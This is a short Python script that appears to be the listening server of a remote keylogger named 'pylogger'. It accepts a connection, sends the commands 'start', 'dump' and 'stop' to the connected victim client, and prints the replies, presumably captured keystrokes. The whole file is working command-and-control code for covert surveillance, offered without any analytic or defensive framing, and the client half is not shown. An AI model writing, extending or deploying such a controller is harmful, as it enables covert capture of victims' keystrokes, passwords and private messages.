from socket import socket, AF_INET, SOCK_STREAM
from sys import argv, exit

s = socket() #create socket
commands = ['start','dump','stop']

if len(argv) >= 2:
    port = int(argv[1])
else:
    print('Usage: server.py <port>')
    exit()
host = ('', port)
s.bind(host)
s.listen(1)
print('[*]Listening on port %i' % port)
while 1:
    try:
        c, addr = s.accept()
        print('[+]Connection from',addr)
        while True:   
            cmd = input('pylogger@%s# ' %addr[0])
            if cmd not in commands:
                print('[*]Available commands:')
                print('[*] -> start')
                print('[*] -> dump')
                print('[*] -> stop')
            else:
                c.send(str.encode(cmd))

                cmd = (str(c.recv(1024)).replace("'",""))
                print(cmd[1:])
    except KeyboardInterrupt:
        break
        exit()
s.close
